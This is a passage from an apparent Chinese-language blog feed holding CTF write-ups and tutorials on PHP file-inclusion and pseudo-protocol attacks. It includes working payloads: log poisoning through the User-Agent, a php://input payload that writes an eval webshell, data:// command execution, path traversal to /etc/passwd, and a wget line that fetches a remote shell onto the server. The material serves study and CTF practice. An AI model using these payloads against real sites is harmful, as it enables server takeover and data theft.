src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220228210922709.png" alt="image-20220228210922709"></p><p>此时可以看见页面上并没有flag，查看源代码之后得到flag</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220228211221785.png" alt="image-20220228211221785"></p><h1 id="81题"><a href="#81题" class="headerlink" title="81题"></a>81题</h1><p>根80题一样是nginx日志的默认路径/var/log/nginx</p><p>http日志的默认路径是/var/log/httpd</p><p>先在User-agent里面输入<code>&lt;?php system(&#39;ls&#39;);?&gt;</code></p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220301192428239.png" alt="image-20220301192428239"></p><p>之后再输入<code>cat fl0g.php</code></p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220301192549546.png" alt="image-20220301192549546"></p><p>打开页面的源代码之后可以看到flag</p><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220301193211074.png" alt="image-20220301193211074"></p><p>注：也可以使用bp抓包之后在User-agent里面进行数据的修改（修改的数据也是一样的）</p><h1 id="82题"><a href="#82题" class="headerlink" title="82题"></a>82题</h1><p><img src="/2022/02/26/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB78-88/image-20220301193522183.png" alt="image-20220301193522183"></p><p>这个题目也可以继续包含fl0g.php这个文件获取flag</p><p>但是这题主要是用session和条件竞争来做（但是不会）</p>]]></content>
      
      
      <categories>
          
          <category> web类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的php伪协议总结</title>
      <link href="/2022/02/25/%E5%B8%B8%E8%A7%81%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/"/>
      <url>/2022/02/25/%E5%B8%B8%E8%A7%81%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>总结一下常见的几种php伪协议</p><span id="more"></span><h1 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p><code>allow_url_fopen:off/on</code></p><p><code>allow_url_include :off/on</code></p><h2 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h2><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()</code>/<code>require()</code>/<code>include_once()</code>/<code>require_once()</code>参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p><h2 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h2><p><code>file://</code>文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也可做为相对路径</p><h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><p>file://[文件的绝对路径和文件名]<br><a href="http://127.0.0.1/include.php?file=file://E:%5CphpStudy%5CPHPTutorial%5CWWW%5Cphpinfo.txt">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</a><br>[文件的相对路径和文件名]<br><a href="http://127.0.0.1/include.php?file=./phpinfo.txt">http://127.0.0.1/include.php?file=./phpinfo.txt</a><br>[http：//网络路径和文件名]<br><a href="http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</a></p><h1 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><p><code>allow_url_fopen:off/on</code></p><p><code>allow_url_include</code> :仅<code>php://input</code> <code>php://stdin</code> <code>php://memory</code> <code>php://temp</code> 需要on</p><h2 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h2><p><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，<code>php://filter</code>用于读取源码，<code>php://input</code>用于执行php代码。</p><p><img src="/2022/02/25/%E5%B8%B8%E8%A7%81%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/20200811234532264.png" alt="20200811234532264.png (864×876)"></p><p><img src="/2022/02/25/%E5%B8%B8%E8%A7%81%E7%9A%84php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/20200811234713906.png" alt="20200811234713906.png (923×586)"></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例:"></a>示例:</h2><p>1.<code>php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</code><br>2.<code>php://input + [POST DATA]执行php代码</code></p><p>如<a href="http://127.0.0.1/include.php?file=php://input">http://127.0.0.1/include.php?file=php://input</a><br>[POST DATA部分]<br><code>&lt;?php phpinfo(); ?&gt;</code></p><p>若有写入权限，还可以写入一句话木马</p><p><a href="http://127.0.0.1/include.php?file=php://input">http://127.0.0.1/include.php?file=php://input</a><br>[POST DATA部分]<br><code>&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</code></p><h1 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; <a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>:// 协议</h1><h2 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a>条件：</h2><p>allow_url_fopen:off/on<br>allow_url_include :off/on</p><h2 id="作用：-2"><a href="#作用：-2" class="headerlink" title="作用："></a>作用：</h2><p>zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</p><h2 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h2><p>1.<code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</code><br><code>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><p>2.<code>compress.bzip2://file.bz2</code><br><code>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><h1 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h1><h2 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h2><p>allow_url_fopen:on<br>allow_url_include :on</p><h2 id="作用：-3"><a href="#作用：-3" class="headerlink" title="作用："></a>作用：</h2><p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p><h2 id="用法：-1"><a href="#用法：-1" class="headerlink" title="用法："></a>用法：</h2><p>data://text/plain<br>data://text/plain;base64,</p><h2 id="示例：-1"><a href="#示例：-1" class="headerlink" title="示例："></a>示例：</h2><p>data://text/plain,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>data://text/plain;base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><h1 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar://协议"></a>phar://协议</h1><h2 id="用法：-2"><a href="#用法：-2" class="headerlink" title="用法："></a>用法：</h2><p>phar://协议与zip://类似，同样可以访问zip格式压缩包内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2022题目复现</title>
      <link href="/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>关于VNCTF2022题目的一些复现</p><span id="more"></span><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="GameV4-0"><a href="#GameV4-0" class="headerlink" title="GameV4.0"></a>GameV4.0</h2><p>查找js/data.js，下面有一段flag的base64加密</p><p><img src="/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20220217220201823.png" alt="image-20220217220201823"></p><p>直接解码，再稍微修改一下即可</p><p>或者直接全局搜索flag，找到被命名为flag的数据</p><p><img src="/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20220217220429089.png" alt="image-20220217220429089"></p><p>点开就是一段被base64编码的数据，解码就可以得到flag</p><p><img src="/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20220217220607791.png" alt="image-20220217220607791"></p><h2 id="gocalc0"><a href="#gocalc0" class="headerlink" title="gocalc0"></a>gocalc0</h2><p>点开题目链接，出现了一个flag在这里的字样</p><p><img src="/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20220217220844583.png" alt="image-20220217220844583"></p><p>点开之后有这样一句话</p><p><img src="/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20220217220939673.png" alt="image-20220217220939673"></p><p>说明flag就在运行的session中，使用bp抓包，看到了session的数据</p><p><img src="/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20220217222850719.png" alt="image-20220217222850719"></p><p>直接base64解码两次得到flag</p><p><img src="/2022/02/17/VNCTF2022%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/image-20220217223041730.png" alt="image-20220217223041730"></p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -wp -VNCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub文件包含刷题</title>
      <link href="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/"/>
      <url>/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>文件包含刷题</p><span id="more"></span><h1 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h1><p>进入环境后审题</p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216232418214.png" alt="image-20220216232418214"></p><p>构造网址，查找当前目录文件</p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216232845009.png" alt="image-20220216232845009"></p><p>发现并没有flag，接着查看根目录</p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216233648243.png" alt="image-20220216233648243"></p><p>找到了存放flag的文档，使用cat命令查看flag，找到了flag</p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216233857079.png" alt="image-20220216233857079"></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>打开题目，先搜索一下strpos()函数</p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216230743122.png" alt="image-20220216230743122"></p><p>点开题目给的shell，发现</p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216231032603.png" alt="image-20220216231032603"></p><p>#request=post+get，所以构造payload，往ctfhub里传参</p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216231325357.png" alt="image-20220216231325357"></p><p>接着搜索其根目录</p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216231652859.png" alt="image-20220216231652859"></p><p>最后cat根目录下的flag </p><p><img src="/2022/02/16/ctfhub%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%B7%E9%A2%98/image-20220216231748067.png" alt="image-20220216231748067"></p>]]></content>
      
      
      <categories>
          
          <category> wp类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web -ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<p>关于文件包含的一些知识</p><span id="more"></span><h1 id="文件包含原理"><a href="#文件包含原理" class="headerlink" title="文件包含原理"></a>文件包含原理</h1><p>文件包含漏洞是“代码注入”的一种。其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。“代码注入”的典型代表就是文件包含。</p><p>要想成功利用文件包含漏洞进行攻击，需要满足以下两个条件：</p><ol><li>Web应用采用include()等文件包含函数通过动态变量的方式引入需要包含的文件;</li><li>用户能够控制该动态变量。</li></ol><h1 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h1><h2 id="1-本地文件包含"><a href="#1-本地文件包含" class="headerlink" title="1.本地文件包含"></a>1.本地文件包含</h2><p>   包含服务器本身存在的恶意文件<br>   a.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>​    b.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b=$_GET[&#x27;id&#x27;];</span><br><span class="line">include($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>​    payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/b.php?id=a.txt //返回phpinfo页面</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）</li><li>被包含的页面的后缀无论是什么都会当做PHP解析</li></ul><h2 id="2-远程文件包含"><a href="#2-远程文件包含" class="headerlink" title="2.远程文件包含"></a>2.远程文件包含</h2><p>包含其他网站上的恶意文件</p><p>远程文件包含利用条件：</p><ul><li>在php.ini中allow_url_fopen=on、allow_url_include=on</li><li>allow_url_fopen = On (允许打开URL文件,预设启用)<br>allow_url_fopen = Off (禁止打开URL文件)<br>allow_url_include = Off (禁止引用URL文件,新版增加功能,预设关闭)<br>allow_url_include = On (允许引用URL文件,新版增加功能）</li></ul><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/b.php?id=http://ip/文件路径</span><br></pre></td></tr></table></figure><p>注：</p><p>​      远程包含的文件路径必须是绝对路径</p><h1 id="常见的存在文件包含的脚本语言以及函数"><a href="#常见的存在文件包含的脚本语言以及函数" class="headerlink" title="常见的存在文件包含的脚本语言以及函数"></a>常见的存在文件包含的脚本语言以及函数</h1><h2 id="1-php"><a href="#1-php" class="headerlink" title="1.php"></a>1.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include():执行到include函数时才文件包含，找不到被包含的文件路径时，发出警告，脚本继续运行</span><br><span class="line">require():只要程序一运行就进行文件包含，找不到被包含的文件路径时，产生致命错误，脚本停止运行</span><br><span class="line">include_once()与require():与上述函数一样，只是若文件中代码已经被包含则不会再次包含</span><br></pre></td></tr></table></figure><h2 id="2-jsp-servlet"><a href="#2-jsp-servlet" class="headerlink" title="2.jsp/servlet"></a>2.jsp/servlet</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ava.io.file()</span><br><span class="line">java.io.filereader()</span><br></pre></td></tr></table></figure><h2 id="3-asp"><a href="#3-asp" class="headerlink" title="3.asp"></a>3.asp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include file</span><br><span class="line">include virtual</span><br></pre></td></tr></table></figure><h1 id="各个协议如何实现命令执行"><a href="#各个协议如何实现命令执行" class="headerlink" title="各个协议如何实现命令执行"></a>各个协议如何实现命令执行</h1><h2 id="1-00截断"><a href="#1-00截断" class="headerlink" title="1.%00截断"></a>1.%00截断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.是否需要截断是根据包含函数后有没有对包含的文件进行拼接一个后缀，如果有就需要使用%00进行截断</span><br><span class="line">2.当php版本&lt;=5.2使用%00截断</span><br></pre></td></tr></table></figure><h2 id="2-file：-用于访问本地文件系统"><a href="#2-file：-用于访问本地文件系统" class="headerlink" title="2.file：//:用于访问本地文件系统"></a>2.file：//:用于访问本地文件系统</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.条件(php.ini)：</span><br><span class="line">    allow_url_fopen   off/on</span><br><span class="line">    allow_url_include off/on</span><br><span class="line">2.使用方法：file：//[文件的绝对路径和文件名]</span><br></pre></td></tr></table></figure><h2 id="3-php-访问各个输入输出流"><a href="#3-php-访问各个输入输出流" class="headerlink" title="3.php://:访问各个输入输出流"></a>3.php://:访问各个输入输出流</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php伪协议：</span><br><span class="line">    php：//filter：用于读取源码并进行bash64编码输出；</span><br><span class="line">    条件（php.ini）：</span><br><span class="line">        allow_url_fope   off/on</span><br><span class="line">        allow_url_include off/on</span><br><span class="line">    php：//input：可以访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行；</span><br><span class="line">    条件(php.ini)：</span><br><span class="line">        allow_url_fope   off/on</span><br><span class="line">        allow_url_include on</span><br><span class="line">    php://stdin是只读的，php://stdout 和 php://stderr 是只写的。</span><br><span class="line">    php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</span><br><span class="line">    php://fd 允许直接访问指定的文件描述符。</span><br></pre></td></tr></table></figure><p>4.zip://,bzip://,zlib://：均属于压缩流，可以访问压缩文件中的子文件，不需要传后缀名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">    allow_url_fope   off/on</span><br><span class="line">    allow_url_include off/on</span><br><span class="line">zip://使用方法：</span><br><span class="line">    zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</span><br><span class="line">bzip2://使用方法：</span><br><span class="line">    bzip2://file.bz2</span><br><span class="line">zlib://使用方法：</span><br><span class="line">    zlib://file.gz</span><br></pre></td></tr></table></figure><p>5.data://</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">条件：</span><br><span class="line">    allow_url_fope   on</span><br><span class="line">    allow_url_include on</span><br></pre></td></tr></table></figure><p><img src="/2022/02/16/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/20180112100157518.png" alt="20180112100157518 (889×328)"></p><p>6.phar://:数据流包装器</p><h1 id="对文件包含的利用"><a href="#对文件包含的利用" class="headerlink" title="对文件包含的利用"></a>对文件包含的利用</h1><h2 id="1-包含上传文件"><a href="#1-包含上传文件" class="headerlink" title="1.包含上传文件"></a>1.包含上传文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用户上传了一个可执行文件，通过文件包含那个文件实现漏洞利用</span><br><span class="line">防御：</span><br><span class="line">    做好上传限制</span><br><span class="line">    隐藏好文件路径</span><br><span class="line">    设置访问权限、执行权限</span><br></pre></td></tr></table></figure><h2 id="2-伪协议"><a href="#2-伪协议" class="headerlink" title="2.伪协议"></a>2.伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">php：//input：用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。</span><br><span class="line">条件：</span><br><span class="line">    php &lt;5.0 ，allow_url_include=Off 情况下也可以用</span><br><span class="line">    php &gt; 5.0，只有在allow_url_fopen=On 时才能使用</span><br><span class="line">例：</span><br><span class="line">    http：//localhost/include/file.php?file=php://input     //URL</span><br><span class="line">    &lt;?php fputs(fopen(&quot;a.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo();?&gt;&quot;)?&gt;  //POST,创建一个文件a.php；并写入phpinfo</span><br><span class="line">data://：将原本的include的文件流重定向到了用户可控制的输入流中</span><br><span class="line">条件：</span><br><span class="line">    allow_url_include=On</span><br><span class="line">    php &gt; 5.2</span><br><span class="line">例：</span><br><span class="line">    http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==      //base64加密&lt;？php system(whoami);？&gt;；直接执行命令</span><br><span class="line">    http://localhost/image.php?imagedata=data://image/jpeg;base64,..... // 后面加上图片木马；图片命令执行</span><br><span class="line">php://filter:这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过</span><br><span class="line">例：</span><br><span class="line">    http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword    //可以跟绝对路径也可以跟相对路径</span><br><span class="line">    http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/2.txt   //远程路径</span><br><span class="line">防御：</span><br><span class="line">    尽量使用安全版本的php</span><br><span class="line">    做好php的安全配置</span><br><span class="line">    对相应目录做相应权限设置</span><br></pre></td></tr></table></figure><h2 id="3-包含日志文件"><a href="#3-包含日志文件" class="headerlink" title="3.包含日志文件"></a>3.包含日志文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、日志的默认路径</span><br><span class="line">    /etc/httpd/logs/access_log或/var/log/httpd/access_log        //apache+linux</span><br><span class="line">    D:xamppapachelogsaccess.log或D:xamppapachelogserror.log  //apache_win2003</span><br><span class="line">    C:WINDOWSsystem32Logfiles                     //iis6.0+win2003</span><br><span class="line">    %SystemDrive%inetpublogsLogFiles            //iis7.0+win2003</span><br><span class="line">    nginx 日志文件在用户安装目录的logs目录下</span><br><span class="line">2、web中间件默认配置uoh文件</span><br><span class="line">    /etc/httpd/conf/httpd.conf或index.php?page=/etc/init.d/httpd        //apache+linux</span><br><span class="line">    C:/Windows/system32/inetsrv/metabase.xml          //iis6.0+win2003</span><br><span class="line">    C:WindowsSystem32inetsrvconfigapplicationHost.config           //iis7.0+win</span><br><span class="line">3、利用</span><br><span class="line">    访问http://www.xx.com/&lt;?php phpinfo(); ?&gt;时，&lt;?php phpinfo(); ?&gt;也会被记录在日志里，也可以插入到User-Agent；但是在日志里这句话被编码了；所以用Burp Suite修改来绕过编码；然后包含相应的日志文件：</span><br><span class="line">    http://localhost/include/file.php?file=../../apache/logs/access.log //（这里利用相对路径，找到日志文件，并以php解析的方式打开)</span><br><span class="line">4、防御</span><br><span class="line">    隐藏或修改默认日志文件</span><br><span class="line">    设置日志文件读取权限</span><br></pre></td></tr></table></figure><h2 id="4-包含-proc-self-environ"><a href="#4-包含-proc-self-environ" class="headerlink" title="4.包含/proc/self/environ"></a>4.包含/proc/self/environ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、找文件包含漏洞</span><br><span class="line">    www.aaa.com/view.php?page=../</span><br><span class="line">    www.aaa.com/view.php?page=../../../../../etc/passwd</span><br><span class="line">2、检查proc/self/environ是否可以访问</span><br><span class="line">    www.aaa.com/view.php?page=../../../../../proc/self/environ</span><br><span class="line">3、如果可读就注入代码</span><br><span class="line">    访问：www.aaa.com/view.php?page=../../../../../proc/self/environ</span><br><span class="line">    选择User-Agent 写代码如下：&lt;?system(&#x27;wget http://www.yourweb.com/oneword.txt -O shell.php&#x27;);?&gt;    //提交请求；我们的命令将被执行(将下载http://www.yourweb.com/oneword.txt，并将其保存为它在shell.php网站目录)，我们的shell也就被创建,.如果不行，尝试使用exec()，因为系统可能被禁用的从php.ini网络服务器.</span><br><span class="line">4、访问shell</span><br><span class="line">5、防御：</span><br><span class="line">    设置proc/self/environ不可访问</span><br></pre></td></tr></table></figure><h2 id="5-包含Session文件"><a href="#5-包含Session文件" class="headerlink" title="5.包含Session文件"></a>5.包含Session文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../tmp/sess_1sv3pu01f97dp3qcfef8i2b9r2         //读取session文件</span><br></pre></td></tr></table></figure><h1 id="常见的绕过与防御"><a href="#常见的绕过与防御" class="headerlink" title="常见的绕过与防御"></a>常见的绕过与防御</h1><h2 id="1-00截断-1"><a href="#1-00截断-1" class="headerlink" title="1.%00截断"></a>1.%00截断</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">说明：</span><br><span class="line">    PHP内核是由C语言实现的，因此使用了C语言中的一些字符串处理函数。在连接字符串时，0字节(x00)将作为字符串的结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串。</span><br><span class="line">防御：</span><br><span class="line">    禁用0字节</span><br></pre></td></tr></table></figure><h2 id="2-超长字符截断"><a href="#2-超长字符截断" 